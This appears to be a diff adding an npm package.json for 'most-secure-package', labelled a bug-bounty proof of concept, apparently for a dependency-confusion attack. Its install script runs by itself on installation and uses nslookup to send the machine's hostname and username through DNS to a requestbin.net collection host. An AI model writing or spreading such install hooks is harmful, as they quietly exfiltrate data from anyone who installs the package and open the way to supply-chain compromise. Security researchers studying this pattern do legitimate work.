@@ -1,0 +1,14 @@
+{
+  "name": "most-secure-package",
+  "version": "100.0.4",
+  "description": "Bugbounty-POC",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup h-$HOSTNAME.u-$(whoami).most-secure-package.be243316447349c82d17.d.requestbin.net"
+  },
+  "author": "hackerman",
+  "license": "ISC",
+  "dependencies": {
+    "codegennativecomponent": "^1.0.3"
+  }
+}
